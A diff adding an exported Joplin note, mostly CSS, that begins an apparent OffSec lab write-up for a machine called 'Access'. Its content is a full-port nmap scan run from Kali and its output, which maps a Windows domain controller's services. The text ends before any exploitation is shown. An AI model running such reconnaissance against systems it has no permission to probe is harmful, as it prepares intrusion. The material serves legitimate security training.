@@ -1,0 +1,1485 @@
+
+				
+				<html>
+					<head>
+						<meta charset="UTF-8"/>
+						<meta name="viewport" content="width=device-width, initial-scale=1"/>
+						<style>pre code.hljs {
+  display: block;
+  overflow-x: auto;
+  padding: 1em;
+}
+
+code.hljs {
+  padding: 3px 5px;
+}
+
+/*
+
+Atom One Light by Daniel Gamage
+Original One Light Syntax theme from https://github.com/atom/one-light-syntax
+
+base:    #fafafa
+mono-1:  #383a42
+mono-2:  #686b77
+mono-3:  #a0a1a7
+hue-1:   #0184bb
+hue-2:   #4078f2
+hue-3:   #a626a4
+hue-4:   #50a14f
+hue-5:   #e45649
+hue-5-2: #c91243
+hue-6:   #986801
+hue-6-2: #c18401
+
+*/
+
+.hljs {
+  color: #383a42;
+  background: #fafafa;
+}
+
+.hljs-comment,
+.hljs-quote {
+  color: #a0a1a7;
+  font-style: italic;
+}
+
+.hljs-doctag,
+.hljs-keyword,
+.hljs-formula {
+  color: #a626a4;
+}
+
+.hljs-section,
+.hljs-name,
+.hljs-selector-tag,
+.hljs-deletion,
+.hljs-subst {
+  color: #e45649;
+}
+
+.hljs-literal {
+  color: #0184bb;
+}
+
+.hljs-string,
+.hljs-regexp,
+.hljs-addition,
+.hljs-attribute,
+.hljs-meta .hljs-string {
+  color: #50a14f;
+}
+
+.hljs-attr,
+.hljs-variable,
+.hljs-template-variable,
+.hljs-type,
+.hljs-selector-class,
+.hljs-selector-attr,
+.hljs-selector-pseudo,
+.hljs-number {
+  color: #986801;
+}
+
+.hljs-symbol,
+.hljs-bullet,
+.hljs-link,
+.hljs-meta,
+.hljs-selector-id,
+.hljs-title {
+  color: #4078f2;
+}
+
+.hljs-built_in,
+.hljs-title.class_,
+.hljs-class .hljs-title {
+  color: #c18401;
+}
+
+.hljs-emphasis {
+  font-style: italic;
+}
+
+.hljs-strong {
+  font-weight: bold;
+}
+
+.hljs-link {
+  text-decoration: underline;
+}</style>
+						<title>Access</title>
+					</head>
+					<body>
+						<div class="exported-note"><div class="exported-note-title">Access</div>
+
+<style>
+		/* https://necolas.github.io/normalize.css/ */
+		html{line-height:1.15;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}
+		article,aside,footer,header,nav,section{display:block}h1{font-size:2em;margin:.67em 0}hr{box-sizing:content-box;height:0;overflow:visible}
+		pre{font-family:monospace,monospace;font-size:1em}a{background-color:transparent;-webkit-text-decoration-skip:objects}
+		b,strong{font-weight:bolder}small{font-size:80%}img{border-style:none}
+
+		body {
+			font-size: 15px;
+			color: #32373F;
+			word-wrap: break-word;
+			line-height: 1.6em;
+			background-color: #ffffff;
+			font-family: 'Avenir Next', 'Avenir', 'Arial', sans-serif;
+			padding-bottom: 0px;
+			padding-top: 0px;
+		}
+		kbd {
+			border: 1px solid rgb(220, 220, 220);
+			box-shadow: inset 0 -1px 0 rgb(220, 220, 220);
+			padding: 2px 4px;
+			border-radius: 3px;
+			background-color: rgb(243, 243, 243);
+		}
+
+		:root {
+			--scrollbar-size: 7px;
+		}
+
+		::-webkit-scrollbar {
+			width: var(--scrollbar-size);
+			height: var(--scrollbar-size);
+		}
+		::-webkit-scrollbar-thumb {
+			border-radius: calc(var(--scrollbar-size) / 2);
+		}
+		::-webkit-scrollbar-corner {
+			background: none;
+		}
+		::-webkit-scrollbar-track {
+			border: none;
+		}
+		::-webkit-scrollbar-thumb {
+			background: rgba(50, 55, 63, 0.54); 
+		}
+		::-webkit-scrollbar-track:hover {
+			background: rgba(0, 0, 0, 0.1); 
+		}
+		::-webkit-scrollbar-thumb:hover {
+			background: rgba(50, 55, 63, 0.63); 
+		}
+
+		
+
+		/* Remove top padding and margin from first child so that top of rendered text is aligned to top of text editor text */
+
+		#rendered-md > h1:first-child,
+		#rendered-md > h2:first-child,
+		#rendered-md > h3:first-child,
+		#rendered-md > h4:first-child,
+		#rendered-md > ul:first-child,
+		#rendered-md > ol:first-child,
+		#rendered-md > table:first-child,
+		#rendered-md > blockquote:first-child,
+		#rendered-md > img:first-child,
+		#rendered-md > p:first-child {
+			margin-top: 0;
+			padding-top: 0;
+		}
+		
+		p, h1, h2, h3, h4, h5, h6, ul, table {
+			margin-top: .6em;
+			margin-bottom: 1.35em;
+
+			/*
+				Adds support for RTL text in the note body. It automatically detects the direction using the content.
+				Issue: https://github.com/laurent22/joplin/issues/3991
+			*/
+			unicode-bidi: plaintext;
+		}
+
+		h1, h2, h3, h4, h5, h6, ul, table {
+			margin-bottom: 0.65em;
+		}
+
+		h1, h2, h3, h4, h5, h6 {
+			line-height: 1.5em;
+		}
+		h1 {
+			font-size: 1.5em;
+			font-weight: bold;
+			border-bottom: 1px solid #dddddd;
+			padding-bottom: .3em;
+		}
+		h2 {
+			font-size: 1.3em;
+			font-weight: bold;
+			padding-bottom: .1em; */
+		}
+		h3 {
+			font-size: 1.1em;
+			font-weight: bold;
+		}
+		h4, h5, h6 {
+			font-size: 1em;
+			font-weight: bold;
+		}
+
+		.exported-note-title {
+			font-size: 2em;
+			font-weight: bold;
+			margin-bottom: 0.8em;
+			line-height: 1.5em;
+			padding-bottom: .35em;
+			border-bottom: 1px solid #dddddd;
+		}
+
+		a {
+			color: #155BDA;
+		}
+		ul, ol {
+			padding-left: 0;
+			margin-left: 1.7em;
+		}
+		li {
+			margin-bottom: .4em;
+		}
+		li p {
+			margin-top: 0.2em;
+			margin-bottom: 0;
+		}
+
+		dt {
+			font-weight: bold;
+			margin-bottom: 0.25em;
+		}
+
+		dd {
+			margin-inline-start: 2.5em;
+			margin-bottom: 0.5em;
+		}
+
+		.resource-icon {
+			display: inline-block;
+			position: relative;
+			top: 0.3em;
+			text-decoration: none;
+			width: 1.2em;
+			height: 1.4em;
+			margin-right: 0.4em;
+			background-color:  #155BDA;
+		}
+    /* These icons are obtained from the wonderful ForkAwesome project by copying the src svgs 
+     * into the css classes below.
+     * svgs are obtained from https://github.com/ForkAwesome/Fork-Awesome/tree/master/src/icons/svg
+     * instead of the svg width, height property you must use a viewbox here, 0 0 1536 1792 is typically the actual size of the icon
+     * each line begins with the pre-amble -webkit-mask: url("data:image/svg+xml;utf8,
+     * and of course finishes with ");
+     * to prevent artifacts it is also necessary to include -webkit-mask-repeat: no-repeat;
+     * on the following line
+     * */
+		.fa-joplin {
+			/* Awesome Font file */
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M373.834 128C168.227 128 0 296.223 0 501.834v788.336C0 1495.778 168.227 1664 373.834 1664h788.336c205.608 0 373.83-168.222 373.83-373.83V501.834C1536 296.224 1367.778 128 1162.17 128zm397.222 205.431h417.424a7.132 7.132 0 0 1 7.132 7.133v132.552c0 4.461-3.619 8.073-8.077 8.073h-57.23c-24.168 0-43.768 19.338-44.284 43.374v2.377h-.017v136.191h-.053l-.466 509.375c-5.02 77.667-39.222 149.056-96.324 201.046-60.28 54.834-141.948 85.017-229.962 85.017-12.45 0-25.208-.61-37.907-1.785-92.157-8.682-181.494-48.601-251.662-112.438-71.99-65.517-117.147-150.03-127.164-238-11.226-98.763 23.42-192.783 95.045-257.937 81.99-74.637 198.185-101.768 316.613-75.704 5.574 1.227 9.55 6.282 9.55 11.997v199.52c-.199 2.625-1.481 6.599-8.183 2.896-.663-.365-1.194-.511-1.653-.531-21.987-10.587-45.159-17.57-68.559-19.916-.38-.04-.757-.124-1.138-.163-.537-.048-1.034-.033-1.556-.075-4.13-.354-8.183-.517-12.203-.58-.87-.011-1.771-.127-2.641-.127-.486 0-.951.05-1.437.057-1.464.011-2.886.115-4.33.163-2.76.102-5.497.211-8.182.448-.273.024-.547.07-.835.097-25.509 2.4-47.864 11.104-65.012 25.47-.954.802-1.974 1.53-2.9 2.36a1.34 1.34 0 0 1-.168.146c-23.96 21.8-34.881 53.872-30.726 90.316 4.62 40.737 26.94 81.156 62.841 113.823 35.908 32.67 80.335 52.977 125.113 57.186 35.118 3.36 66.547-3.919 89.899-20.461a97.255 97.255 0 0 0 9.365-7.501c2.925-2.661 5.569-5.5 8.086-8.416.3-.348.672-.673.975-1.024 8.253-9.864 14.222-21.067 17.996-33.148.639-2.034 1.051-4.148 1.564-6.227.381-1.563.81-3.106 1.112-4.693.555-2.784.923-5.632 1.253-8.49.086-.709.183-1.414.237-2.128.492-4.893.693-9.858.55-14.91h.013V521.623c-2.01-22.626-20.78-40.434-43.928-40.434h-57.23a8.071 8.071 0 0 1-8.077-8.073V340.564a7.132 7.132 0 0 1 7.136-7.133z'/></svg>");
+		}
+		.fa-file-image {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-128-448v320H256v-192l192-192 128 128 384-384zm-832-192c-106 0-192-86-192-192s86-192 192-192 192 86 192 192-86 192-192 192z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-pdf {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-514-593c25 20 53 38 84 56 42-5 81-7 117-7 67 0 152 8 177 49 7 10 13 28 2 52-1 1-2 3-3 4v1c-3 18-18 38-71 38-64 0-161-29-245-73-139 15-285 46-392 83-103 176-182 262-242 262-10 0-19-2-28-7l-24-12c-3-1-4-3-6-5-5-5-9-16-6-36 10-46 64-123 188-188 8-5 18-2 23 6 1 1 2 3 2 4 31-51 67-116 107-197 45-90 80-178 104-262-32-109-42-221-24-287 7-25 22-40 42-40h22c15 0 27 5 35 15 12 14 15 36 9 68-1 3-2 6-4 8 1 3 1 5 1 8v30c-1 63-2 123-14 192 35 105 87 190 146 238zm-576 411c30-14 73-57 137-158-75 58-122 124-137 158zm398-920c-10 28-10 76-2 132 3-16 5-31 7-44 2-17 5-31 7-43 1-3 2-5 4-8-1-1-1-3-2-5-1-18-7-29-13-36 0 2-1 3-1 4zm-124 661c88-35 186-63 284-81-10-8-20-15-29-23-49-43-93-103-127-176-19 61-47 126-83 197-15 28-30 56-45 83zm646-16c-5-5-31-24-140-24 49 18 94 28 124 28 9 0 14 0 18-1 0-1-1-2-2-3z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-word {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM233 768v107h70l164 661h159l128-485c5-15 8-30 10-46 1-8 2-16 2-24h4l3 24c3 14 4 30 9 46l128 485h159l164-661h70V768h-300v107h90l-99 438c-4 16-6 33-7 46l-2 21h-4c0-6-2-14-3-21-3-13-5-30-9-46L825 768H711l-144 545c-4 16-5 33-8 46l-4 21h-4l-2-21c-1-13-3-30-7-46l-99-438h90V768H233z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-powerpoint {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-992-234v106h327v-106h-93v-167h137c43 0 82-2 118-15 90-31 146-124 146-233s-54-193-137-228c-38-15-84-19-130-19H416v107h92v555h-92zm353-280H650V882h120c35 0 62 6 83 18 36 21 56 62 56 115 0 56-20 99-62 120-21 10-47 15-78 15z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-excel {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-979-234v106h281v-106h-75l103-161c12-19 18-34 21-34h2c1 4 3 7 5 10 4 8 10 14 17 24l107 161h-76v106h291v-106h-68l-192-273 195-282h67V768H828v107h74l-103 159c-12 19-21 34-21 33h-2c-1-4-3-7-5-10-4-7-9-14-17-23L648 875h76V768H434v107h68l189 272-194 283h-68z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-audio {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM620 850c12 5 20 17 20 30v544c0 13-8 25-20 30-4 1-8 2-12 2-8 0-16-3-23-9l-166-167H288c-18 0-32-14-32-32v-192c0-18 14-32 32-32h131l166-167c10-9 23-12 35-7zm417 689c19 0 37-8 50-24 83-102 129-231 129-363s-46-261-129-363c-22-28-63-32-90-10-28 23-32 63-9 91 65 80 100 178 100 282s-35 202-100 282c-23 28-19 68 9 90 12 10 26 15 40 15zm-211-148c17 0 34-7 47-20 56-60 87-137 87-219s-31-159-87-219c-24-26-65-27-91-3-25 24-27 65-2 91 33 36 52 82 52 131s-19 95-52 131c-25 26-23 67 2 91 13 11 29 17 44 17z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-video {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM768 768c70 0 128 58 128 128v384c0 70-58 128-128 128H384c-70 0-128-58-128-128V896c0-70 58-128 128-128h384zm492 2c12 5 20 17 20 30v576c0 13-8 25-20 30-4 1-8 2-12 2-8 0-17-3-23-9l-265-266v-90l265-266c6-6 15-9 23-9 4 0 8 1 12 2z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-archive {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M640 384V256H512v128h128zm128 128V384H640v128h128zM640 640V512H512v128h128zm128 128V640H640v128h128zm700-388c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H768v128H640V128H128v1536h1280zM781 943c85 287 107 349 107 349 5 17 8 34 8 52 0 111-108 192-256 192s-256-81-256-192c0-18 3-35 8-52 0 0 21-62 120-396V768h128v128h79c29 0 54 19 62 47zm-141 465c71 0 128-29 128-64s-57-64-128-64-128 29-128 64 57 64 128 64z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-code {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM480 768c11-14 31-17 45-6l51 38c14 11 17 31 6 45l-182 243 182 243c11 14 8 34-6 45l-51 38c-14 11-34 8-45-6l-226-301c-8-11-8-27 0-38zm802 301c8 11 8 27 0 38l-226 301c-11 14-31 17-45 6l-51-38c-14-11-17-31-6-45l182-243-182-243c-11-14-8-34 6-45l51-38c14-11 34-8 45 6zm-620 461c-18-3-29-20-26-37l138-831c3-18 20-29 37-26l63 10c18 3 29 20 26 37l-138 831c-3 18-20 29-37 26z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-alt, .fa-file-csv {
+      /* fork-awesome doesn't have csv so we use the text icon */
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM384 800c0-18 14-32 32-32h704c18 0 32 14 32 32v64c0 18-14 32-32 32H416c-18 0-32-14-32-32v-64zm736 224c18 0 32 14 32 32v64c0 18-14 32-32 32H416c-18 0-32-14-32-32v-64c0-18 14-32 32-32h704zm0 256c18 0 32 14 32 32v64c0 18-14 32-32 32H416c-18 0-32-14-32-32v-64c0-18 14-32 32-32h704z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		blockquote {
+			border-left: 4px solid rgb(220, 220, 220);
+			padding-left: 1.2em;
+			margin-left: 0;
+			opacity: 0.7;
+		}
+
+		.jop-tinymce table,
+		table {
+			text-align: left;
+			border-collapse: collapse;
+			border: 1px solid rgb(220, 220, 220);
+			background-color: #ffffff;
+		}
+
+		.jop-tinymce table td, .jop-tinymce table th,
+		table td, th {
+			text-align: left;
+			padding: .5em 1em .5em 1em;
+			font-size: 15;
+			color: #32373F;
+			font-family: 'Avenir Next', 'Avenir', 'Arial', sans-serif;
+		}
+
+		.jop-tinymce table td,
+		table td {
+			border: 1px solid rgb(220, 220, 220);
+		}
+
+		.jop-tinymce table th,
+		table th {
+			border: 1px solid rgb(220, 220, 220);
+			border-bottom: 2px solid rgb(220, 220, 220);
+			background-color: rgb(247, 247, 247);
+		}
+
+		.jop-tinymce table tr:nth-child(even),
+		table:has(thead) tr:nth-child(even) {
+			background-color: rgb(247, 247, 247);
+		}
+
+		.jop-tinymce table tr:hover,
+		table tr:hover {
+			background-color: #e5e5e5;
+		}
+
+		hr {
+			border: none;
+			border-bottom: 2px solid #dddddd;
+		}
+		img {
+			max-width: 100%;
+			height: auto;
+		}
+		
+		.inline-code,
+		.mce-content-body code {
+			border: 1px solid rgb(220, 220, 220);
+			background-color: rgb(243, 243, 243);
+			padding-right: .2em;
+			padding-left: .2em;
+			border-radius: .25em;
+			color: rgb(0,0,0);
+			font-size: .9em;
+		}
+
+		.highlighted-keyword {
+			background-color: #F3B717;
+			color: black;
+		}
+
+		
+	.not-loaded-resource img {
+		width: 1.15em;
+		height: 1.15em;
+		background: white;
+		padding: 2px !important;
+		border-radius: 2px;
+		box-shadow: 0 1px 3px #000000aa;
+	}
+
+	a.not-loaded-resource img {
+		margin-right: .2em;
+	}
+
+	a.not-loaded-resource {
+		display: flex;
+		flex-direction: row;
+		align-items: center;
+	}
+
+
+		.md-checkbox input[type=checkbox]:checked {
+			opacity: 0.7;
+		}
+
+		.jop-tinymce ul.joplin-checklist .checked,
+		.md-checkbox .checkbox-label-checked {
+			opacity: 0.5;
+		}
+
+		.exported-note {
+			padding: 1em;
+		}
+
+		.joplin-editable .joplin-source {
+			display: none;
+		}
+
+		mark {
+			background: #F7D26E;
+			color: black;
+		}
+
+		/* =============================================== */
+		/* For TinyMCE */
+		/* =============================================== */
+
+		.mce-content-body {
+			/* Note: we give a bit more padding at the bottom, to allow scrolling past the end of the document */
+			padding: 5px 10px 10em 0;
+		}
+
+		/*
+		.mce-content-body code {
+			background-color: transparent;
+		}
+		*/
+
+		.mce-content-body [data-mce-selected=inline-boundary] {
+			background-color: transparent;
+		}
+
+		.mce-content-body .joplin-editable {
+			cursor: pointer !important;
+		}
+
+		.mce-content-body.mce-content-readonly {
+			opacity: 0.5;
+		}
+
+		/* We need that to make sure click events have the A has a target */
+		.katex a span {
+			pointer-events: none;
+		}
+
+		.media-player {
+			width: 100%;
+			margin-top: 10px;
+		}
+
+		.media-player.media-pdf {
+			min-height: 35rem;
+			width: 100%;
+			max-width: 1000px;
+			margin: 0;
+			border: 0;
+			display: block;
+		}
+
+		/* Clear the CODE style if the element is within a joplin-editable block */
+		.mce-content-body .joplin-editable code {
+			border: none;
+			background: none;
+			padding: 0;
+			color: inherit;
+			font-size: inherit;
+		}
+
+		/* To make code blocks horizontally scrollable */
+		/* https://github.com/laurent22/joplin/issues/5740 */
+		pre.hljs {
+			overflow-x: auto;
+		}
+
+		.joplin-table-wrapper{
+			overflow-x: auto;
+			overflow-y: hidden;
+		}
+
+		/* =============================================== */
+		/* For TinyMCE */
+		/* =============================================== */
+
+		@media print {
+			body {
+				height: auto !important;
+			}
+
+			pre {
+				white-space: pre-wrap;
+			}
+
+			.code, .inline-code {
+				border: 1px solid #CBCBCB;
+			}
+
+			#joplin-container-content {
+				/* The height of the content is set dynamically by JavaScript (in updateBodyHeight) to go
+				   around various issues related to scrolling. However when printing we don't want this
+				   fixed size as that would crop the content. So we set it to auto here. "important" is
+				   needed to override the style set by JavaScript at the element-level. */
+				height: auto !important;
+			}
+		}
+	
+
+				/*
+					FOR THE MARKDOWN EDITOR
+				*/
+
+				/* Remove the indentation from the checkboxes at the root of the document
+				   (otherwise they are too far right), but keep it for their children to allow
+				   nested lists. Make sure this value matches the UL margin. */
+
+				li.md-checkbox {
+					list-style-type: none;
+				}
+
+				li.md-checkbox input[type=checkbox] {
+					margin-left: -1.71em;
+					margin-right: 0.7em;
+					position: relative;
+					top: 1px;
+				}
+				
+				ul.joplin-checklist {
+					list-style:none;
+				}
+
+				/*
+					FOR THE RICH TEXT EDITOR
+				*/
+
+				ul.joplin-checklist li::before {
+					content:"\f14a";
+					font-family:"Font Awesome 5 Free";
+					background-size: 16px 16px;
+					pointer-events: all;
+					cursor: pointer;
+					width: 1em;
+					height: 1em;
+					margin-left: -1.3em;
+					position: absolute;
+					color: #32373F;
+				}
+
+				.joplin-checklist li:not(.checked)::before {
+					content:"\f0c8";
+				}
+
+				.abc-notation-block svg {
+					background-color: white;
+				}
+			
+.mermaid { width: 640px; }
+pre.mermaid[data-processed=true] { white-space: unset; }
+.mermaid-export-graph {
+					opacity: 0;
+					height: 0;
+					z-index: 1;
+					position: relative;
+				} 
+				.joplin-editable:hover .mermaid-export-graph,
+				.joplin-editable .mermaid-export-graph:has(:focus-visible) {
+					opacity: 1;
+				}
+				.mermaid-export-graph > button:hover {
+					background-color: #CBDAF1 !important;
+				}</style><div id="rendered-md"><h2 id="access">Access</h2>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Access]
+&boxur;&boxh;$ sudo nmap -sS -sV -A 192.168.229.187 -p-     
+[sudo] password for kali: 
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-23 16:28 EST
+Nmap scan report for 192.168.229.187
+Host is up (0.0057s latency).
+Not shown: 65509 closed tcp ports (reset)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
+|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: Access The Event
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-23 21:28:53Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name)
+443/tcp   open  ssl/http      Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
+| tls-alpn: 
+|_  http/1.1
+|_ssl-date: TLS randomness does not represent time
+|_http-title: Access The Event
+| http-methods: 
+|_  Potentially risky methods: TRACE
+| ssl-cert: Subject: commonName=localhost
+| Not valid before: 2009-11-10T23:48:47
+|_Not valid after:  2019-11-08T23:48:47
+|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49671/tcp open  msrpc         Microsoft Windows RPC
+49674/tcp open  msrpc         Microsoft Windows RPC
+49679/tcp open  msrpc         Microsoft Windows RPC
+49701/tcp open  msrpc         Microsoft Windows RPC
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.95%E=4%D=1/23%OT=53%CT=1%CU=31166%PV=Y%DS=4%DC=T%G=Y%TM=6973E85
+OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=107%TI=I%CI=I%TS=U)SEQ(SP=1
+OS:02%GCD=1%ISR=10B%TI=I%CI=I%TS=U)SEQ(SP=103%GCD=1%ISR=10A%TI=I%CI=I%TS=U)
+OS:SEQ(SP=106%GCD=1%ISR=10A%TI=I%CI=I%TS=U)SEQ(SP=F5%GCD=1%ISR=FD%TI=I%CI=I
+OS:%TS=U)OPS(O1=M578NW8NNS%O2=M578NW8NNS%O3=M578NW8%O4=M578NW8NNS%O5=M578NW
+OS:8NNS%O6=M578NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(
+OS:R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS
+OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=
+OS:Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=
+OS:R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%R
+OS:UCK=G%RUD=G)IE(R=N)
+
+Network Distance: 4 hops
+Service Info: Host: SERVER; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2026-01-23T21:30:01
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+|_clock-skew: 2s
+
+TRACEROUTE (using port 143/tcp)
+HOP RTT     ADDRESS
+1   4.86 ms 192.168.45.1
+2   4.84 ms 192.168.45.254
+3   4.87 ms 192.168.251.1
+4   4.90 ms 192.168.229.187
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 97.62 seconds</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Access]
+&boxur;&boxh;$ sudo nmap -sS -sV -A 192.168.229.187 -p-     
+[sudo] password for kali: 
